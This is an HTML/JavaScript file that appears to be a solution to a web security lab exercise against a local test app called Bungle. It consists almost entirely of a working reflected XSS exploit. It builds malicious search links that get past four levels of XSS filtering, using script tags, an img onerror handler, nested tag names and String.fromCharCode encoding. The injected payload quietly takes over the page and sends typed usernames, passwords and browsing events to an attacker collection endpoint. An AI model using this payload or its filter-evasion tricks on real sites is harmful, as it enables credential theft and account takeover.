<meta charset="utf-8">
<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script>
function payload(attacker) {
var afterStack = [];
var prevStack = [];
var UID = 0
var nextUIDBack = 0;
curHref = "./"
function pushStack(url){
nextUIDBack+=1
window.history.pushState({ UID: nextUIDBack }, "");
prevStack.push(url);
}
function createAccount(username, password) {
$.post("./create", { username: username, password: password },
    function (data, status) {
        proxy("./");
    });
}
function login(username, password) {
$.post("./login", { username: username, password: password },
    function (data, status) {
        proxy("./");
    });
}
window.addEventListener('popstate', function (event) {
var eventUID
if(event.state == null){
    eventUID = 0
}
else {
    eventUID = event.state.UID;
}
if (eventUID == null) {
    eventUID = 0
}
console.log(`UID:${UID}`)
console.log(`eventUID:${eventUID}`)
if (eventUID > UID) {
    prevStack.push(curHref);
    newUrl = afterStack.pop()
    console.log(newUrl)
    proxy(newUrl)
} else if (eventUID < UID) {
    afterStack.push(curHref);
    newUrl = prevStack.pop();
    console.log(newUrl)
    proxy(newUrl)
}
else { }
})
function proxy(href) {
curHref = href

if (nextUIDBack != 0) {
    if(history.state == null){
        UID = 0
    }
    else {
        UID = history.state.UID;
    }
    history.replaceState(history.state, "");
}
$("html").load(href, function () {  
    $("html").show(); 
    var username = $("#0c01fe1da7").text();
    if(username!= ""){
        $.get(attacker, {event:"nav", user:username, uri:href})
    }
    else{
        $.get(attacker, { event:"nav", uri:href})
    }
    if (href.includes("search?")) {
        $("a").each(function () {
            if ($(this).attr("href").includes("payload")) {
                $(this).remove()
            }
            $(this).click("submit", function (event) {
                event.preventDefault();
                proxy("./" + $(this).attr("href").replace(/ /g,"+"));
            });
        })
    }
    console.log(`hrefBeforeEvent${href}`)

    $("#19338cd873").on("click", function (event) {
        event.preventDefault();
        var username = $("#16f78a7d63").val();
        var password = $("#05d49692b7").val();
        pushStack(href)
        $.get(`${attacker}`, `event=login&user=${username}&pass=${password}`);
        login(username, password);
    });
    $("#436c4c3d62").on("click", function (event) {
        event.preventDefault();
        var username = $("#16f78a7d63").val();
        var password = $("#05d49692b7").val();
        pushStack(href)
        $.get(`${attacker}`, { event: "createacc", user: username, pass: password })
        $.post("./create", { username: username, password: password }, function () { });
        proxy("./");
    });

    $("#940d115ef6").on("click", function (event) {
        event.preventDefault()
        var searchTerm = $("#a8b771920b").val().replace(/ /g,"+")
        pushStack(href)
        proxy(`./search?q=${searchTerm}`)
    })
    $("#e08ed8d9a0").on("click", function (event) {
        event.preventDefault()
        pushStack(href)
        proxy('./')
    })
    $("#9dd1a7b06d").on("click", function (event) {
        event.preventDefault()
        pushStack(href)
        proxy('./')
    })
    $("#d7f7af8669").on("click", function (event) {
        event.preventDefault()
        var username = $("#0c01fe1da7").text();
        pushStack(href)
        $.get(`${attacker}`, { event: "logout", username: username })
        $.post("./logout", { username: username }, function () {
            proxy("./")
            })
    })
});
}
$("html").hide();
proxy("./");
}
function convertToCharCode(data) {
	var convertedText = "";
	var i = 0;

	for (i = 1; i < data.length - 2;i++) {
		convertedText += data.charCodeAt(i) + ",";
	}

	convertedText += data.charCodeAt(data.length - 2);
	convertedText = "String.fromCharCode(" + convertedText + ")";

	return convertedText;

}

function processUrl(url) {
	var regex = /\"[^\"]*\"/; 
	var match = regex.exec(url);
    console.log(match)
	var encoded = "";
	for (let i = 0; i < match.length; i++) {
		encoded = convertToCharCode(match[i].toString());
		url = url.replace(regex, encoded);
	}

	url = url.replace(/;/g, " ");
	return url;
}
function makeLink(xssdefense, target, attacker) {
    if (xssdefense == 0) {
        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
            encodeURIComponent("<script" + ">" + payload.toString() +
                ";payload(\"" + attacker + "\");</script" + ">");
    } else if (xssdefense ==2) {
        var scriptBody = payload.toString() + ";payload(\"" + attacker + "\");";
        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<img src='invalid.jpg' onerror=\"" + scriptBody + "\">");
    // Implement code to defeat XSS defenses here.
    } 
    else if (xssdefense == 1) {
        var url = target + "./search?xssdefense=" + xssdefense.toString() + "&q=";
        var scriptBody = payload.toString() + ";payload(\"" + attacker + "\");";
        return url + encodeURIComponent("<scrscriptipt>" + scriptBody + " </scrscriptipt" + ">"); 
    }
    else if (xssdefense == 3) {
        var url = target + "./search?xssdefense=" + xssdefense.toString() + "&q=";
        var scriptBody = payload.toString() + ";payload(\"" + attacker + "\");";
        var encodedText = "<script" + "> " + scriptBody + " </script" + ">";
		encodedText = processUrl(encodedText);
        console.log("here")
		return url + encodeURIComponent(encodedText);
    }
 }
var xssdefense = 3;
var target = "http://localhost:34443/project3/";

var attacker = "http://127.0.0.1:31339/stolen";
//var attacker = "http://0.0.0.0:31340/stolen"
$(function() {
    var url = makeLink(xssdefense, target, attacker);
    $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
});
</script>
<h3></h3>